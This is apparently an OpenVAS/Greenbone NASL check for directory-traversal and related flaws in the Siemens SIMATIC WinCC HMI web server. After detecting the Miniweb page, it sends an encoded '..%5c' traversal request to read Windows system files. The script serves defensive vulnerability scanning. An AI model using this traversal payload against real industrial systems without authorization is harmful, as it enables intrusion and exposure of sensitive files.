if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103572" );
	script_bugtraq_id( 51836 );
	script_cve_id( "CVE-2011-4512", "CVE-2011-4878", "CVE-2011-4879" );
	script_tag( name: "cvss_base", value: "8.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:C" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_name( "Siemens SIMATIC WinCC HMI Web Server Multiple Input Validation Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/51836" );
	script_xref( name: "URL", value: "http://www.automation.siemens.com/mcms/human-machine-interface/en/visualization-software/scada/Pages/Default.aspx" );
	script_xref( name: "URL", value: "http://www.us-cert.gov/control_systems/pdf/ICSA-12-030-01A.pdf" );
	script_xref( name: "URL", value: "http://www.us-cert.gov/control_systems/pdf/ICSA-12-030-01.pdf" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-09-20 11:25:41 +0200 (Thu, 20 Sep 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Updates are available. Please see the references for more information." );
	script_tag( name: "summary", value: "Siemens SIMATIC WinCC is prone to an HTTP-header-injection issue, a
  directory-traversal issue, and an arbitrary memory-read access issue because the application fails to
  properly sanitize user-supplied input." );
	script_tag( name: "impact", value: "A remote attacker can exploit these issues to gain elevated
  privileges, obtain sensitive information, or cause denial-of-service conditions." );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
url = "/www/start.html";
if(http_vuln_check( port: port, url: url, pattern: "Miniweb Start Page", usecache: TRUE )){
	files = traversal_files( "windows" );
	for file in keys( files ) {
		url = "/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c" + files[file];
		if(http_vuln_check( port: port, url: url, pattern: file )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

